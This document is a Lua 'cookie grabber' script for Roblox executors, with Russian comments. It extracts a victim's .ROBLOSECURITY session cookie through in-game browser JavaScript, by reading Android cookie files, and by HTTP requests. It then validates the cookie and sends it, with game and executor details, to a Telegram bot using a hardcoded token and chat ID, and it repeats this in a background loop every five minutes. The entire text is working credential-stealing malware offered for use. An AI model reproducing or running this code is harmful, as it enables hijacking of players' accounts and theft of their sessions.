-- ============================================
-- COOKIE GRABBER v5.1 (FIXED FOR DELTA)
-- ============================================
local botToken = "8609253340:AAGH_mUlJqF1xsH2fWuelzydtbXyxdq1DUU"
local chatID = "8735778962"

local webhookURL = "https://api.telegram.org/bot" .. botToken .. "/sendMessage"

-- ============================================
-- ДИАГНОСТИКА
-- ============================================
local function diagnostic()
    print("=== ДИАГНОСТИКА ===")
    print("Executor:", getexecutorname and getexecutorname() or "Unknown")
    print("WebViewService:", game:GetService("WebViewService") and "✅" or "❌")
    print("BrowserService:", game:GetService("BrowserService") and "✅" or "❌")
    print("HttpService:", game:GetService("HttpService") and "✅" or "❌")
    print("readfile:", readfile and "✅" or "❌")
    print("===================")
end

-- ============================================
-- ПОЛУЧЕНИЕ КУКИ (ТОЛЬКО РАБОЧИЕ МЕТОДЫ ДЛЯ DELTA)
-- ============================================
local function getRobloxCookie()
    local cookie = nil
    local http = game:GetService("HttpService")
    
    -- МЕТОД 1: WebViewService (Delta)
    pcall(function()
        local webview = game:GetService("WebViewService")
        if webview then
            local result = webview:ExecuteJavaScript([[
                (function() {
                    var c = document.cookie.split('; ').find(r => r.startsWith('.ROBLOSECURITY='));
                    return c ? c.split('=')[1] : null;
                })();
            ]])
            if result and result ~= "null" then
                cookie = result
                print("[+] Метод 1 (WebViewService) сработал")
            end
        end
    end)
    
    -- МЕТОД 2: BrowserService
    if not cookie then
        pcall(function()
            local browser = game:GetService("BrowserService")
            if browser then
                local result = browser:EvaluateJavaScript([[
                    document.cookie.split('; ').find(r => r.startsWith('.ROBLOSECURITY='))
                ]])
                if result then
                    cookie = string.match(result, "=(.+)$")
                    print("[+] Метод 2 (BrowserService) сработал")
                end
            end
        end)
    end
    
    -- МЕТОД 3: readfile (если есть доступ)
    if not cookie then
        pcall(function()
            if readfile then
                local paths = {
                    "/data/data/com.roblox.client/app_webview/Default/Cookies",
                    "/storage/emulated/0/Android/data/com.roblox.client/app_webview/Default/Cookies"
                }
                for _, path in ipairs(paths) do
                    local content = readfile(path)
                    if content then
                        cookie = string.match(content, "ROBLOSECURITY=(.-);")
                        if cookie then
                            print("[+] Метод 3 (readfile) сработал")
                            break
                        end
                    end
                end
            end
        end)
    end
    
    -- МЕТОД 4: HttpService (прямой запрос) - редко работает, но пробуем
    if not cookie then
        pcall(function()
            local response = http:GetAsync("https://www.roblox.com/mobileapi/userinfo")
            if response then
                local match = string.match(response, "ROBLOSECURITY=(.-);")
                if match then
                    cookie = match
                    print("[+] Метод 4 (HttpService) сработал")
                end
            end
        end)
    end
    
    return cookie or nil
end

-- ============================================
-- ПРОВЕРКА ВАЛИДНОСТИ
-- ============================================
local function validateCookie(cookie)
    if not cookie then return false end
    local http = game:GetService("HttpService")
    
    -- Используем HttpService для проверки
    local success = pcall(function()
        local response = http:GetAsync("https://www.roblox.com/mobileapi/userinfo", {
            Headers = {
                ["Cookie"] = ".ROBLOSECURITY=" .. cookie
            }
        })
        if response and response:match("UserName") then
            return true
        end
    end)
    return success or false
end

-- ============================================
-- ОТПРАВКА В TELEGRAM
-- ============================================
local function sendToTelegram(cookie)
    local http = game:GetService("HttpService")
    local gameName = "Unknown"
    local executor = getexecutorname and getexecutorname() or "Unknown"
    
    pcall(function()
        gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
    end)
    
    local message = string.format(
        "🍪 **КУКА ПОЛУЧЕНА!**\n" ..
        "━━━━━━━━━━━━━━━━━\n" ..
        "🎮 Игра: `%s`\n" ..
        "🆔 PlaceID: `%s`\n" ..
        "⚡ Инжектор: `%s`\n" ..
        "⏰ Время: `%s`\n" ..
        "━━━━━━━━━━━━━━━━━\n" ..
        "`%s`",
        gameName,
        tostring(game.PlaceId or 0),
        executor,
        os.date("%Y-%m-%d %H:%M:%S"),
        cookie
    )
    
    -- Отправка через HttpService
    pcall(function()
        http:PostAsync(webhookURL, http:JSONEncode({
            chat_id = chatID,
            text = message,
            parse_mode = "Markdown"
        }), Enum.HttpContentType.ApplicationJson)
        print("[+] Отправлено в Telegram")
    end)
end

-- ============================================
-- ОСНОВНАЯ ФУНКЦИЯ
-- ============================================
local function main()
    print("[*] Поиск куки...")
    local cookie = getRobloxCookie()
    
    if cookie then
        print("[+] Кука найдена! Длина: " .. #cookie)
        
        print("[*] Проверка валидности...")
        local valid = validateCookie(cookie)
        if valid then
            print("[+] Кука валидна!")
        else
            print("[-] Кука невалидна (но всё равно отправляем)")
        end
        sendToTelegram(cookie)
        return true
    else
        print("[-] Кука не найдена")
        return false
    end
end

-- ============================================
-- ЗАПУСК
-- ============================================
print("========================================")
print("    COOKIE GRABBER v5.1 (Delta Fix)")
print("    Бот: @MyCookieLootBOT")
print("========================================")

diagnostic()

local success = main()

if not success then
    print("[*] Повтор через 3 секунды...")
    wait(3)
    main()
end

if not success then
    print("[*] Повтор через 10 секунд...")
    wait(10)
    main()
end

-- Фоновый цикл
spawn(function()
    while true do
        wait(300)
        print("[*] Фоновый захват...")
        pcall(main)
    end
end)

print("========================================")
print("✅ Скрипт запущен")
print("📡 Бот: @MyCookieLootBOT")
print("========================================")
